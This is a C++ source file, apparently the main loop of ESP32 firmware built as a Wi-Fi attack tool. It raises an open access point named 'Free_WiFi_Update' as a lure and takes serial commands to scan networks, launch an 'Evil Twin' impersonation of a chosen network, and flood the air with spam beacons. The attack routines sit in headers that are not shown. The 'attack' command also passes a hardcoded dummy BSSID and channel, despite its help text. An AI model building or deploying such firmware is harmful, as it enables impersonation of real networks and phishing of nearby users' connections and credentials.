#include <Arduino.h>
#include <WiFi.h>
#include "attacks.h"
#include "web_server.h"

String command_buffer = "";

void setup() {
    Serial.begin(115200);
    Serial.println("\n\n--- ESP32 Custom Firmware Ready ---");
    Serial.println("Type 'help' to see available commands");
    
    WiFi.mode(WIFI_AP);
    WiFi.softAP("Free_WiFi_Update", "");
    Serial.print("AP IP: ");
    Serial.println(WiFi.softAPIP());
    
    initAttacks();
    initWebServer();
}

void loop() {
    handleWebServer();

    // قراءة الأوامر من السيريال
    while (Serial.available()) {
        char c = Serial.read();
        if (c == '\n' || c == '\r') {
            if (command_buffer.length() > 0) {
                command_buffer.trim();
                
                if (command_buffer == "help") {
                    Serial.println("Available Commands:");
                    Serial.println("  scan              - Scan for WiFi networks");
                    Serial.println("  attack <SSID>     - Start Evil Twin on specific SSID (uses BSSID from scan)");
                    Serial.println("  spam <name> <num> - Start Beacon Spam");
                    Serial.println("  stop              - Stop all attacks");
                } 
                else if (command_buffer == "scan") {
                    Serial.println("Scanning...");
                    WiFi.mode(WIFI_STA);
                    WiFi.disconnect();
                    delay(100);
                    int n = WiFi.scanNetworks();
                    for (int i = 0; i < n; ++i) {
                        Serial.printf("%d: %s (BSSID: %s, CH: %d)\n", i, WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(), WiFi.channel(i));
                    }
                    WiFi.mode(WIFI_AP);
                    WiFi.softAP("Free_WiFi_Update", "");
                }
                else if (command_buffer.startsWith("attack ")) {
                    String ssid = command_buffer.substring(7);
                    Serial.println("Attack command received for: " + ssid);
                    // ملاحظة: للهجوم الفعلي، نحتاج BSSID والقناة. سنستخدم شبكة وهمية عشوائية هنا.
                    // للحصول على BSSID دقيق، يجب استخدام أمر scan أولاً.
                    uint8_t dummy_bssid[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
                    startEvilTwin(ssid, dummy_bssid, 1); 
                }
                else if (command_buffer.startsWith("spam ")) {
                    int space1 = command_buffer.indexOf(' ', 5);
                    if (space1 > 0) {
                        String name = command_buffer.substring(5, space1);
                        int count = command_buffer.substring(space1 + 1).toInt();
                        startBeaconSpam(name, count);
                    } else {
                        Serial.println("Usage: spam <name> <count>");
                    }
                }
                else if (command_buffer == "stop") {
                    stopAllAttacks();
                    Serial.println("All attacks stopped.");
                }
                else {
                    Serial.println("Unknown command. Type 'help'.");
                }
                command_buffer = "";
            }
        } else {
            command_buffer += c;
        }
    }
}
